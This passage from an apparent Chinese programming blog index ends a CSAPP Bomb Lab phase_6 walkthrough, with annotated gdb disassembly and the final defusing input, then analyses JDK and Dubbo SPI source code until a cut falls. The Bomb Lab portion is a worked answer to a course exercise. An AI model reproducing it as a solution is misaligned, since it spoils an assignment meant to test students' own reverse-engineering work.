&lt;+32&gt;: mov %r13,%rbp # %r12置0,并且%r13 %r14 %rbp 均和 %rsp 指向相同地址 0x0000000000401117 &lt;+35&gt;: mov 0x0(%r13),%eax 0x000000000040111b &lt;+39&gt;: sub $0x1,%eax 0x000000000040111e &lt;+42&gt;: cmp $0x5,%eax # 判断输入的数字是否为6个 0x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt; 0x0000000000401123 &lt;+47&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401128 &lt;+52&gt;: add $0x1,%r12d # 将%r12加1，相当于index从1到5 0x000000000040112c &lt;+56&gt;: cmp $0x6,%r12d # 判断%r12是否等于6，等于6就跳转 0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt; 0x0000000000401132 &lt;+62&gt;: mov %r12d,%ebx # 将index移到到%ebx ----------------------------------------------------------- LoopB-start 0x0000000000401135 &lt;+65&gt;: movslq %ebx,%rax # 将%ebx移动到%rax = index 0x0000000000401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax # 获取输入的6个值 0x000000000040113b &lt;+71&gt;: cmp %eax,0x0(%rbp) # 判端(%rbp)这个值于(%rbp)的第%eax的值是否相等，不相等继续 0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt; 0x0000000000401140 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x0000000000401145 &lt;+81&gt;: add $0x1,%ebx # index加1 0x0000000000401148 &lt;+84&gt;: cmp $0x5,%ebx # index &lt;= 5 0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt; # 跳转到65 ----------------------------------------------------------- LoopB-end 0x000000000040114d &lt;+89&gt;: add $0x4,%r13 # %r13加4，指向下一个数，判断所有数都不相等 0x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; # 跳转到32 ============================================================ LoopA-end 0x0000000000401153 &lt;+95&gt;: lea 0x18(%rsp),%rsi # 将 %rsi 指向栈中跳过读入数据位置作为结束标记,并且 %r14 仍和 %rsp 指向同一个位置 0x0000000000401158 &lt;+100&gt;: mov %r14,%rax # 将%r14复制到%rax ============================================================ LoopC-start 0x000000000040115b &lt;+103&gt;: mov $0x7,%ecx # 将0x7复制到%exc 0x0000000000401160 &lt;+108&gt;: mov %ecx,%edx # 将0x7复制到%edx 0x0000000000401162 &lt;+110&gt;: sub (%rax),%edx # 7减去%rax地址的数，也是%rsp的第i个数 0x0000000000401164 &lt;+112&gt;: mov %edx,(%rax) # 在把这个数替换了 0x0000000000401166 &lt;+114&gt;: add $0x4,%rax # 指向下一个数 0x000000000040116a &lt;+118&gt;: cmp %rsi,%rax # 是否全部循环完了 0x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; ============================================================ LoopC-end 0x000000000040116f &lt;+123&gt;: mov $0x0,%esi # 将%rsi设置为0 0x0000000000401174 &lt;+128&gt;: jmp 0x401197 &lt;phase_6+163&gt; # 获取数据%ecx，和%rdx是一个地址，是一个链表 0x0000000000401176 &lt;+130&gt;: mov 0x8(%rdx),%rdx # 将0x8(%rdx)存的内容复制到%rdx，指向下一个 0x000000000040117a &lt;+134&gt;: add $0x1,%eax # %eax加1 0x000000000040117d &lt;+137&gt;: cmp %ecx,%eax # %ecx和%eax 是否相等 0x000000000040117f &lt;+139&gt;: jne 0x401176 &lt;phase_6+130&gt; # 不相等，继续遍历 0x0000000000401181 &lt;+141&gt;: jmp 0x401188 &lt;phase_6+148&gt; # 相等，跳转到148 0x0000000000401183 &lt;+143&gt;: mov $0x6032d0,%edx # 重置链表首地址 0x0000000000401188 &lt;+148&gt;: mov %rdx,0x20(%rsp,%rsi,2) # 将%rdx的值复制到0x20(%rsp,%rsi,2) 0x000000000040118d &lt;+153&gt;: add $0x4,%rsi # 遍历下一个 0x0000000000401191 &lt;+157&gt;: cmp $0x18,%rsi 0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt; 0x0000000000401197 &lt;+163&gt;: mov (%rsp,%rsi,1),%ecx # 将 (%rsp + %rsi * 1) 数据复制到%ecx，我们前面构造的6个数字 0x000000000040119a &lt;+166&gt;: cmp $0x1,%ecx # 是否小于1 0x000000000040119d &lt;+169&gt;: jle 0x401183 &lt;phase_6+143&gt; # 如果小于等于1，%eax指向链表首地址 0x000000000040119f &lt;+171&gt;: mov $0x1,%eax # 将%eax设置为1 0x00000000004011a4 &lt;+176&gt;: mov $0x6032d0,%edx # 将%rdx指向内存 $0x6032d 0x00000000004011a9 &lt;+181&gt;: jmp 0x401176 &lt;phase_6+130&gt; --------------------------------------------------------- 0x00000000004011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx # 将0x20(%rsp)链表信息复制到%rbx 0x00000000004011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax # 将%rax指向下一个链表 0x00000000004011b5 &lt;+193&gt;: lea 0x50(%rsp),%rsi # 将%rsi指向保存链表地址的末地址 0x00000000004011ba &lt;+198&gt;: mov %rbx,%rcx 0x00000000004011bd &lt;+201&gt;: mov (%rax),%rdx 0x00000000004011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx) 0x00000000004011c4 &lt;+208&gt;: add $0x8,%rax 0x00000000004011c8 &lt;+212&gt;: cmp %rsi,%rax 0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt; 0x00000000004011cd &lt;+217&gt;: mov %rdx,%rcx 0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt; --------------------------------------------------------- 0x00000000004011d2 &lt;+222&gt;: movq $0x0,0x8(%rdx) 0x00000000004011da &lt;+230&gt;: mov $0x5,%ebp 0x00000000004011df &lt;+235&gt;: mov 0x8(%rbx),%rax # 将%rax指向%rbx下一个节点 0x00000000004011e3 &lt;+239&gt;: mov (%rax),%eax 0x00000000004011e5 &lt;+241&gt;: cmp %eax,(%rbx) # 比较每个节点是否是递减 0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt; 0x00000000004011e9 &lt;+245&gt;: callq 0x40143a &lt;explode_bomb&gt; 0x00000000004011ee &lt;+250&gt;: mov 0x8(%rbx),%rbx 0x00000000004011f2 &lt;+254&gt;: sub $0x1,%ebp 0x00000000004011f5 &lt;+257&gt;: jne 0x4011df &lt;phase_6+235&gt; 0x00000000004011f7 &lt;+259&gt;: add $0x50,%rsp 0x00000000004011fb &lt;+263&gt;: pop %rbx 0x00000000004011fc &lt;+264&gt;: pop %rbp 0x00000000004011fd &lt;+265&gt;: pop %r12 0x00000000004011ff &lt;+267&gt;: pop %r13 0x0000000000401201 &lt;+269&gt;: pop %r14 0x0000000000401203 &lt;+271&gt;: retq(gdb) x/24xw 0x006032d0(gdb) x/24xw 0x006032d0 # 链表为 12 Byte 分别为 int int 指向下一个链表的地址0x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 主要过程分为以下几步： 获取 6 个数字 判断每个数字都大于0且小于7，并且都不相同 交换一下位子，arr[i] 与 arr[7-i] 的数交换一下 按照获取 arr 的排序的值，把对应的链表进行重新排列 重排之后的链表要递减 最后我们看 0x006032d0 地址链表的值，大小顺序为3 4 5 6 1 2 然后我们只要输入4 3 2 1 6 5 就可以。 最后我们看看结果，发现已经全部通过了。 总结做完这个 lab ，学习到了 gdb 调试方法，对汇编更加深入的了解，总体来说这个实验还是挺有意思的。 参考 深入理解计算机系统 Bomb Lab CSAPP 之 Bomb Lab CSAPP bomb lab 问题","link":"/2020/10/31/CSAPP_Bomb_Lab/"},{"title":"Dubbo SPI源码分析","text":"对于一个优秀的框架需要很好的扩展性，给出一个接口，自己可以给出默认实现，同时也允许其他人实现拓展。即“对扩展开放，对修改封闭”的原则。Dubbo 采用微内核+插件的方式来实现，微内核架构中，内核通常采用 Factory、IoC、OSGi 等方式管理插件生命周期，Dubbo 最终决定采用 SPI 机制来加载插件，Dubbo SPI 参考 JDK 原生的 SPI 机制，进行了性能优化以及功能增强。 我们来看看 SPI 定义： Service Provider Interface (SPI) is an API intended to be implemented or extended by a third party. It can be used to enable framework extension and replaceable components. JDK SPIJDK SPI 最比较常见的在访问数据库会使用到java.sql.Driver这个接口，不同的数据库产商会有不同的实现，JDK SPI机制可以为某个接口寻找服务实现。 JDK SPI 机制我们先看一个例子，模拟连接数据库，先定义一个 Driver 接口。 package com.cuzz.api;public interface Driver { void connect(String url);} 然后不同的产商有不同的实现，以 mysql 和 oracle 两个实现。 package com.cuzz.mysql;import com.cuzz.api.Driver;public class MysqlDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect mysql: &quot; + url); }}// -----------------package com.cuzz.oracle;import com.cuzz.api.Driver;public class OracleDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect oracle: &quot; + url); }} 在项目的 resources/META-INF/services 目录下添加一个名为 com.cuzz.api.Driver 的文件，这是 JDK SPI 需要读取的配置文件，具体内容如下： com.cuzz.mysql.MysqlDrivercom.cuzz.oracle.OracleDriver 加载配置： public class Main { public static void main(String[] args) { // Java spi 机制 ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class); System.out.println(serviceLoader); Iterator&lt;Driver&gt; iterator = serviceLoader.iterator(); while (iterator.hasNext()) { Driver driver = iterator.next(); driver.connect(&quot;localhost:3306&quot;); } }} 运行结果： java.util.ServiceLoader[com.cuzz.api.Driver]connect mysql: localhost:3306connect oracle: localhost:3306 JDK SPI 源码分析我们从ServiceLoader&lt;Driver&gt; serviceLoader = ServiceLoader.load(Driver.class);定位到ServiceLoader构造方法中的java.util.ServiceLoader#reload方法 // 前缀private static final String PREFIX = &quot;META-INF/services/&quot;;// The class or interface representing the service being loadedprivate final Class&lt;S&gt; service;// The class loader used to locate, load, and instantiate providersprivate final ClassLoader loader;// The access control context taken when the ServiceLoader is createdprivate final AccessControlContext acc;// Cached providers, in instantiation order// 缓存private LinkedHashMap&lt;String,S&gt; providers = new LinkedHashMap&lt;&gt;();// The current lazy-lookup iterator// 懒加载迭代器private LazyIterator lookupIterator;public void reload() { providers.clear(); lookupIterator = new LazyIterator(service, loader);} 重点看看这个 LazyIterator 类，这是一个内部类，主要以懒加载形式实现。Iterator 这个接口需要实现 Iterator#hasNext 方法和 Iterator#next 方法，hasNext方法调用了LazyIterator#hasNextService，而next方法调用LazyIterator#nextService。 private class LazyIterator implements Iterator&lt;S&gt; { Class&lt;S&gt; service; ClassLoader loader; // 像这样的URL file:/Users/cuzz/Projects/Java/dubbo/cuzz-demo/cuzz-demo-spi/target/classes/META-INF/services/com.cuzz.api.Driver Enumeration&lt;URL&gt; configs = null; Iterator&lt;String&gt; pending = null; String nextName = null; private LazyIterator(Class&lt;S&gt; service, ClassLoader loader) { this.service = service; this.loader = loader; } private boolean hasNextService() { if (nextName != null) { return true; } // 第一次获取，config 为空开始加载文件 if (configs == null) { try { // 获取文件名 META-INF/services/com.cuzz.api.Driver String fullName = PREFIX + service.getName(); // 加载配置路径 if (loader == null) configs = ClassLoader.getSystemResources(fullName); else configs = loader.getResources(fullName); } catch (IOException x) { fail(service, &quot;Error locating configuration files&quot;, x); } } while ((pending == null) || !pending.hasNext()) { if (!configs.hasMoreElements()) { return false; } // 解析文件 pending = parse(service, configs.nextElement()); } // 把实现类的名称记录下来 com.cuzz.mysql.MysqlDriver nextName = pending.next(); return true; } private S nextService() { if (!hasNextService()) throw new NoSuchElementException(); // 存一个备份 String cn = nextName; nextName = null; Class&lt;?&gt; c = null; try { // 通过反射获取该实现类 c = Class.forName(cn, false, loader); } catch (ClassNotFoundException x) { fail(service, &quot;Provider &quot; + cn + &quot; not found&quot;); } if (!service.isAssignableFrom(c)) { fail(service, &quot;Provider &quot; + cn + &quot; not a subtype&quot;); } try { S p = service.cast(c.newInstance()); providers.put(cn, p); return p; } catch (Throwable x) { fail(service, &quot;Provider &quot; + cn + &quot; could not be instantiated&quot;, x); } throw new Error(); // This cannot happen } public boolean hasNext() { if (acc == null) { return hasNextService(); } else { PrivilegedAction&lt;Boolean&gt; action = new PrivilegedAction&lt;Boolean&gt;() { public Boolean run() { return hasNextService(); } }; return AccessController.doPrivileged(action, acc); } } public S next() { if (acc == null) { return nextService(); } else { PrivilegedAction&lt;S&gt; action = new PrivilegedAction&lt;S&gt;() { public S run() { return nextService(); } }; return AccessController.doPrivileged(action, acc); } } public void remove() { throw new UnsupportedOperationException(); }} 最后我们来 ServiceLoader#iterator 这个方法是怎么实现的，主要是先走缓存，在走懒加载。 public Iterator&lt;S&gt; iterator() { return new Iterator&lt;S&gt;() { Iterator&lt;Map.Entry&lt;String,S&gt;&gt; knownProviders = providers.entrySet().iterator(); public boolean hasNext() { // 先走缓存，在走懒加载 if (knownProviders.hasNext()) return true; return lookupIterator.hasNext(); } public S next() { // 先走缓存，在走懒加载 if (knownProviders.hasNext()) return knownProviders.next().getValue(); return lookupIterator.next(); } public void remove() { throw new UnsupportedOperationException(); } };} JDK SPI 在 JDBC 中的应用当我们引入mysql 驱动时候，在 META-INF/services 目录下，有一个 java.sql.Driver 文件，内容如下。 om.mysql.jdbc.Drivercom.mysql.fabric.jdbc.FabricMySQLDriver 当我们要链接 JDBC 会通过 DriverManager驱动管理来连接。 String url = &quot;jdbc:mysql://localhost:3306/demo?useSSL=true&amp;useUnicode=true&amp;characterEncoding=UTF-8&quot;;String username = &quot;root&quot;;String pwd = &quot;12345&quot;;Connection conn = DriverManager.getConnection(url, username, pwd); DriverManager类的静态方法在 JVM加载类的时候会执行，执行 loadInitialDrivers 方法。 private final static CopyOnWriteArrayList&lt;DriverInfo&gt; registeredDrivers = new CopyOnWriteArrayList&lt;&gt;();static { loadInitialDrivers(); println(&quot;JDBC DriverManager initialized&quot;); } private static void loadInitialDrivers() { // 看看系统属性是否配置了jdbc.drivers String drivers; try { drivers = AccessController.doPrivileged(new PrivilegedAction&lt;String&gt;() { public String run() { return System.getProperty(&quot;jdbc.drivers&quot;); } }); } catch (Exception ex) { drivers = null; } // If the driver is packaged as a Service Provider, load it. // Get all the drivers through the classloader // exposed as a java.sql.Driver.class service. // ServiceLoader.load() replaces the sun.misc.Providers() AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() { public Void run() { // JDK SPI 方式加载并实例化 ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class); Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator(); /* Load these drivers, so that they can be instantiated. * It may be the case that the driver class may not be there * i.e. there may be a packaged driver with the service class * as implementation of java.sql.Driver but the actual class * may be missing. In that case a java.util.ServiceConfigurationError * will be thrown at runtime by the VM trying to locate * and load the service. * * Adding a try catch block to catch those runtime errors * if driver not available in classpath but it's * packaged as service and that service is there in classpath. */ try{ while(driversIterator.hasNext()) { driversIterator.next(); } } catch(Throwable t) { // Do nothing } return null; } }); println(&quot;DriverManager.initialize: jdbc.drivers = &quot; + drivers); if (drivers == null || drivers.equals(&quot;&quot;)) { return; } // 配置了jdbc.dirvers属性通过反射实例化 String[] driversList = drivers.split(&quot;:&quot;); println(&quot;number of Drivers:&quot; + driversList.length); for (String aDriver : driversList) { try { println(&quot;DriverManager.Initialize: loading &quot; + aDriver); Class.forName(aDriver, true, ClassLoader.getSystemClassLoader()); } catch (Exception ex) { println(&quot;DriverManager.Initialize: load failed: &quot; + ex); } }} 实例化 java.sql.Driver 接口实现类，在MySQL提供的，会吧自己注册到 DriverManager 中。 package com.mysql.jdbc;import java.sql.SQLException;public class Driver extends NonRegisteringDriver implements java.sql.Driver { // Register ourselves with the DriverManager static { try { // 注册到DriverManager的CopyOnWriteArrayList中 java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(&quot;Can't register driver!&quot;); } }} 最后调用 DriverManager#getConnection 从注册中获取连接。 // Worker method called by the public getConnection() methods.private static Connection getConnection( String url, java.util.Properties info, Class&lt;?&gt; caller) throws SQLException { // 循环从注册中获取，获取到一个就返回。 for(DriverInfo aDriver : registeredDrivers) { try { Connection con = aDriver.driver.connect(url, info); if (con != null) { // Success! println(&quot;getConnection returning &quot; + aDriver.driver.getClass().getName()); return (con); } } catch (SQLException ex) { if (reason == null) { reason = ex; } } }} JDK SPI 的缺点 虽然ServiceLoader也算是使用的延迟加载，但是基本只能通过遍历全部获取，也就是接口的实现类全部加载并实例化一遍。如果你并不想用某些实现类，它也被加载并实例化了，这就造成了浪费。 获取某个实现类的方式不够灵活，只能通过Iterator形式获取，不能根据某个参数来获取对应的实现类。 Dubbo SPIDubbo SPI 对 JDK SPI 进行了扩展，由原来的提供者类的全限定名列表改成了 K-V 形式，如果 SPI 配置文件中定义了多个实现类，而我们只需要使用其中一个实现类时，就会生成不必要的对象，除此之外 Dubbo 对 JDK SPI 做了三个方面的扩展： 方便获取扩展实现：JDK SPI仅仅通过接口类名获取所有实现，而 ExtensionLoader 则通过接口类名和key值获取一个实现。 IOC依赖注入功能：Adaptive实现，就是生成一个代理类，这样就可以根据实际调用时的一些参数动态决定要调用的类了。 采用装饰器模式进行功能增强，自动包装实现，这种实现的类一般是自动激活的，常用于包装类，比如：Protocol的两个实现类：ProtocolFilterWrapper、ProtocolListenerWrapper。 Dubbo 按照 SPI 配置文件的用途，将其分成了三类目录。 META-INF/services/ 目录：该目录下的 SPI 配置文件用来兼容 JDK SPI 。 META-INF/dubbo/ 目录：该目录用于存放用户自定义 SPI 配置文件。 META-INF/dubbo/internal/ 目录：该目录用于存放 Dubbo 内部使用的 SPI 配置文件。 Dubbo SPI 机制定义一个接口，用 @SPI 标识表示是 Dubbo SPI。 @SPIpublic interface Driver { void connect(String url);} 实现类： package com.cuzz.mysql;import com.cuzz.api.Driver;public class MysqlDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect mysql: &quot; + url); }}// -----------------package com.cuzz.oracle;import com.cuzz.api.Driver;public class OracleDriver implements Driver { @Override public void connect(String url) { System.out.println(&quot;connect oracle: &quot; + url); }} 在项目的 resources/META-INF/dubbo 目录下添加一个名为 com.cuzz.api.Driver 的文件，这是 Dubbo SPI 需要读取的配置文件，与JDK SPI 不一样是KV形式，具体内容如下： mysqlDriver=com.cuzz.mysql.MysqlDriveroracleDriver=com.cuzz.oracle.OracleDriver 获取实现类： public class App { public static void main(String[] args) { Driver driver = ExtensionLoader.getExtensionLoader(Driver.class).getExtension(&quot;mysqlDriver&quot;); driver.connect(&quot;localhost:3306&quot;); }} 输出： connect mysql: localhost:3306 Dubbo SPI 主流程我们先从获取 ExtensLoader 实例开始，ExtensionLoader#getExtensionLoader /** * Dubbo 中一个扩展接口对应一个 ExtensionLoader 实例，该集合缓存了全部 ExtensionLoader 实例， * 其中的 Key 为扩展接口，Value 为加载其扩展实现的 ExtensionLoader 实例。 */private static final ConcurrentMap&lt;Class&lt;?&gt;, ExtensionLoader&lt;?&gt;&gt; EXTENSION_LOADERS = new ConcurrentHashMap&lt;&gt;(64);public static &lt;T&gt; ExtensionLoader&lt;T&gt; getExtensionLoader(Class&lt;T&gt; type) { if (type == null) { throw new IllegalArgumentException(&quot;Extension type == null&quot;); } // 必须为接口 if (!type.isInterface()) { throw new IllegalArgumentException(&quot;Extension type (&quot; + type + &quot;) is not an interface!&quot;); } // 必须有@SPI接口 if (!withExtensionAnnotation(type)) { throw new IllegalArgumentException(&quot;Extension type (&quot; + type + &quot;) is not an extension, because it is NOT annotated with @&quot; + SPI.class.getSimpleName() + &quot;!&quot;); } // 从缓存中获取 ExtensionLoader&lt;T&gt; loader = (ExtensionLoader&lt;T&gt;) EXTENSION_LOADERS.get(type); if (loader == null) { // 如果已经存在 key 就不往 map 中添加 EXTENSION_LOADERS.putIfAbsent(type, new ExtensionLoader&lt;T&gt;(type)); // ---&gt; loader = (ExtensionLoader&lt;T&gt;) EXTENSION_LOADERS.get(type); } return loader;} 接着看看 ExtensionLoader#ExtensionLoader 构造方法，如果 type 不为 ExtensionFactory.class 初始化拓展适配器。 /*** 表示拓展类实例工厂，可以通过工厂创建实例*/private final ExtensionFactory objectFactory;private ExtensionLoader(Class&lt;?&gt; type) { this.type = type; // 初始化拓展适配器 objectFactory = (type == ExtensionFactory.class ? null : ExtensionLoader.getExtensionLoader(ExtensionFactory.class).getAdaptiveExtension());} 获取拓展实现类，ExtensionLoader#getExtension /*** 缓存了该 ExtensionLoader 加载的扩展名与扩展实现对象之间的映射关系。*/private final ConcurrentMap&lt;String, Holder&lt;Object&gt;&gt; cachedInstances = new ConcurrentHashMap&lt;&gt;();public T getExtension(String name) { if (StringUtils.isEmpty(name)) { throw new IllegalArgumentException(&quot;Extension name == null&quot;); } // @SPI中value有值，如@SPI(&quot;dubbo&quot;) 默认获取 key 为 dubbo 的 Extension if (&quot;true&quot;.equals(name)) { return getDefaultExtension(); } // getOrCreateHolder()方法中封装了查找cachedInstances缓存的逻辑 final Holder&lt;Object&gt; holder = getOrCreateHolder(name); Object instance = holder.get(); if (instance == null) { synchronized (holder) { // 双重锁防止并发 instance = holder.get(); if (instance == null) { instance = createExtension(name); // ---&gt; holder.set(instance); } } } return (T) instance;}private Holder&lt;Object&gt; getOrCreateHolder(String name) { Holder&lt;Object&gt; holder = cachedInstances.get(name); if (holder == null) { cachedInstances.putIfAbsent(name, new Holder&lt;&gt;()); holder = cachedInstances.get(name); } return holder;} ExtensionLoader#createExtension 方法中完成了 SPI 配置文件的查找以及相应扩展实现类的实例化，同时还实现了自动装配以及自动 Wrapper 包装等功能。 private T createExtension(String name) { // 获取 cachedClasses 缓存，根据扩展名从 cachedClasses 缓存中获取扩展实现类。 Class&lt;?&gt; clazz = getExtensionClasses().get(name); // ---&gt; 1 if (clazz == null) { throw findException(name); } try { // 根据扩展实现类从 EXTENSION_INSTANCES 缓存中查找相应的实例。如果查找失败，会通过反射创建扩展实现对象。 T instance = (T) EXTENSION_INSTANCES.get(clazz); if (instance == null) { EXTENSION_INSTANCES.putIfAbsent(clazz, clazz.newInstance()); instance = (T) EXTENSION_INSTANCES.get(clazz); } // 自动装配扩展实现对象中的属性（即调用其 setter）。这里涉及 ExtensionFactory 以及自动装配的相关内容。 injectExtension(instance); // 自动包装扩展实现对象。这里涉及 Wrapper 类以及自动包装特性的相关内容. Set&lt;Class&lt;?&gt;&gt; wrapperClasses = cachedWrapperClasses; if (CollectionUtils.isNotEmpty(wrapperClasses)) { for (Class&lt;?&gt; wrapperClass : wrapperClasses) { instance = injectExtension((T) wrapperClass.getConstructor(type).newInstance(instance)); } } // 如果扩展实现类实现了 Lifecycle 接口，在 initExtension() 方法中会调用 initialize() 方法进行初始化。 initExtension(instance); return instance; } catch (Throwable t) { throw new IllegalStateException(&quot;Extension instance (name: &quot; + name + &quot;, class: &quot; + type + &quot;) couldn't be instantiated: &quot; + t.getMessage(), t); }} Dubbo SPI 获取拓展类ExtensionLoader#getExtensionClasses /*** 缓存了该 ExtensionLoader 加载的扩展名与扩展实现类之间的映射关系。cachedNames 集合的反向关系缓存。*/private final Holder&lt;Map&lt;String, Class&lt;?&gt;&gt;&gt; cachedClasses = new Holder&lt;&gt;();private Map&lt;String, Class&lt;?&gt;&gt; getExtensionClasses() { // 先从缓存中获取 Map&lt;String, Class&lt;?&gt;&gt; classes = cachedClasses.get(); if (classes == null) { synchronized (cachedClasses) { classes = cachedClasses.get(); if (classes == null) { // 加载类 classes = loadExtensionClasses(); // ---&gt; cachedClasses.set(classes); } } } return classes;} ExtensionLoader#loadExtensionClasses /*** synchronized in getExtensionClasses*/private Map&lt;String, Class&lt;?&gt;&gt; loadExtensionClasses() { // 只能有一个默认值 cacheDefaultExtensionName(); // 加载的扩展名与扩展实现类之间的映射关系 Map&lt;String, Class&lt;?&gt;&gt; extensionClasses = new HashMap&lt;&gt;(); for (LoadingStrategy strategy : strategies) { loadDirectory(extensionClasses, strategy.directory(), type.getName(), strategy.preferExtensionClassLoader(), strategy.overridden(), strategy.excludedPackages()); // ---&gt; loadDirectory(extensionClasses, strategy.directory(), type.getName().replace(&quot;org.apache&quot;, &quot;com.alibaba&quot;), strategy.preferExtensionClassLoader(), strategy.overridden(), strategy.excludedPackages()); } return extensionClasses;}private void cacheDefaultExtensionName() { final SPI defaultAnnotation = type.getAnnotation(SPI.class); if (defaultAnnotation == null) { return; } String value = defaultAnnotation.value(); // 只能有一个车默认值，这种 @SPI(&quot;dubbo,http&quot;) 就会报错 if ((value = value.trim()).length() &gt; 0) { String[] names = NAME_SEPARATOR.split(value); if (names.length &gt; 1) { throw new IllegalStateException(&quot;More than 1 default extension name on extension &quot; + type.getName() + &quot;: &quot; + Arrays.toString(names)); } if (names.length == 1) { cachedDefaultName = names[0]; } }} ExtensionLoader#loadDirectory private void loadDirectory(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, String dir, String type, boolean extensionLoaderClassLoaderFirst, boolean overridden, String... excludedPackages) { String fileName = dir + type; try { Enumeration&lt;java.net.URL&gt; urls = null; ClassLoader classLoader = findClassLoader(); // try to load from ExtensionLoader's ClassLoader first if (extensionLoaderClassLoaderFirst) { ClassLoader extensionLoaderClassLoader = ExtensionLoader.class.getClassLoader(); if (ClassLoader.getSystemClassLoader() != extensionLoaderClassLoader) { urls = extensionLoaderClassLoader.getResources(fileName); } } if (urls == null || !urls.hasMoreElements()) { if (classLoader != null) { urls = classLoader.getResources(fileName); } else { urls = ClassLoader.getSystemResources(fileName); } } // 循环获取 if (urls != null) { while (urls.hasMoreElements()) { java.net.URL resourceURL = urls.nextElement(); loadResource(extensionClasses, classLoader, resourceURL, overridden, excludedPackages); // ---&gt; } } } catch (Throwable t) { logger.error(&quot;Exception occurred when loading extension class (interface: &quot; + type + &quot;, description file: &quot; + fileName + &quot;).&quot;, t); }} ExtensionLoader#loadResource private void loadResource(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, ClassLoader classLoader, java.net.URL resourceURL, boolean overridden, String... excludedPackages) { try { // 必须 utf-8 格式 try (BufferedReader reader = new BufferedReader(new InputStreamReader(resourceURL.openStream(), StandardCharsets.UTF_8))) { String line; while ((line = reader.readLine()) != null) { final int ci = line.indexOf('#'); if (ci &gt;= 0) { // 去掉注释 line = line.substring(0, ci); } line = line.trim(); if (line.length() &gt; 0) { try { String name = null; int i = line.indexOf('='); if (i &gt; 0) { name = line.substring(0, i).trim(); line = line.substring(i + 1).trim(); } // 没有被排除外 if (line.length() &gt; 0 &amp;&amp; !isExcluded(line, excludedPackages)) { loadClass(extensionClasses, resourceURL, Class.forName(line, true, classLoader), name, overridden); // ---&gt; } } catch (Throwable t) { IllegalStateException e = new IllegalStateException(&quot;Failed to load extension class (interface: &quot; + type + &quot;, class line: &quot; + line + &quot;) in &quot; + resourceURL + &quot;, cause: &quot; + t.getMessage(), t); exceptions.put(line, e); } } } } } catch (Throwable t) { logger.error(&quot;Exception occurred when loading extension class (interface: &quot; + type + &quot;, class file: &quot; + resourceURL + &quot;) in &quot; + resourceURL, t); }} ExtensionLoader#loadClass private void loadClass(Map&lt;String, Class&lt;?&gt;&gt; extensionClasses, java.net.URL resourceURL, Class&lt;?&gt; clazz, String name, boolean overridden) throws NoSuchMethodException { if (!type.isAssignableFrom(clazz)) { throw new IllegalStateException(&quot;Error occurred when loading extension class (interface: &quot; + type + &quot;, class line: &quot; + clazz.getName() + &quot;), class &quot; + clazz.getName() + &quot; is not subtype of interface.&quot;); } // 处理Adaptive注解，若存在则将该实现类保存至cachedAdaptiveClass属性 if (clazz.isAnnotationPresent(Adaptive.class)) { cacheAdaptiveClass(clazz, overridden); } // 是否为包装类，是包装类缓存到 cachedWrapperClasses Set中 else if (isWrapperClass(clazz)) { cacheWrapperClass(clazz); } else { clazz.getConstructor(); if (StringUtils.isEmpty(name)) { name = findAnnotationName(clazz); if (name.length() == 0) { throw new IllegalStateException(&quot;No such extension name for the class &quot; + clazz.getName() + &quot; in the config &quot; + resourceURL); } } // key可以为多个，如：mysqlDriver,mysqlDriver2=com.cuzz.mysql.MysqlDriver String[] names = NAME_SEPARATOR.split(name); if (ArrayUtils.isNotEmpty(names)) { // 缓存到 cachedActivates 属性中 cacheActivateClass(clazz, names[0]); for (String n : names) { // 缓存了该 ExtensionLoader 加载的扩展实现类与扩展名之间的映射关系。 cacheName(clazz, n); // 加载的扩展名与扩展实现类之间的映射关系 saveInExtensionClass(extensionClasses, clazz, n, overridden); } } }}private void cacheAdaptiveClass(Class&lt;?&gt; clazz, boolean overridden) { if (cachedAdaptiveClass == null || overridden) { cachedAdaptiveClass = clazz; } else if (!cachedAdaptiveClass.equals(clazz)) { throw new IllegalStateException(&quot;More than 1 adaptive class found: &quot; + cachedAdaptiveClass.getName() + &quot;, &quot; + clazz.getName()); }} Dubbo SPI 的自动包装和自动注入回到前面我们分析ExtensionLoader#createExtension方法，现在我们重点关注 ExtensionLoader#injectExtension 方法 private T createExtension(String name) { // 获取 cachedClasses 缓存，根据扩展名从 cachedClasses 缓存中获取扩展实现类。 Class&lt;?&gt; clazz = getExtensionClasses().get(name); if (clazz == null) { throw findException(name); } try { // 根据扩展实现类从 EXTENSION_INSTANCES 缓存中查找相应的实例。如果查找失败，会通过反射创建扩展实现对象。 T instance = (T) EXTENSION_INSTANCES.get(clazz); if (instance == null) { EXTENSION_INSTANCES.putIfAbsent(clazz, clazz.newInstance()); instance = 